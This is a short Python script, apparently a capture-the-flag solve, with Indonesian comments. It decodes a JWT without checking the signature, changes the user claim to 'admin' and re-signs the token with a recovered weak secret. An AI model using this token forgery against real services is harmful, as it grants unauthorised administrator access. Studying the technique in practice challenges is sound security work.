import jwt

# 1. Token asli yang ingin diubah
old_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.hlht7uqMfJWBXINRilmhIEstPPs0jO_F0HgWM9LZnJc"

# 2. Secret Key yang kamu temukan (Misal: "secret-123")
SECRET_KEY = "ilovepico"

try:
    # 3. Dekode tanpa verifikasi untuk mengambil data lama
    payload = jwt.decode(old_token, options={"verify_signature": False})
    
    # 4. Ubah isi payload
    #payload['role'] = "admin"
    payload['user'] = "admin"
    
    # 5. Generate ulang dengan algoritma HS256 dan Key yang ditemukan
    # Kita hapus 'kid' dari header jika tidak diperlukan, atau biarkan jika server mencarinya
    new_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")

    print("--- HASIL MODIFIKASI HS256 ---")
    print(f"Payload Baru: {payload}")
    print(f"Token Baru  : {new_token}")

except Exception as e:
    print(f"Terjadi kesalahan: {e}")
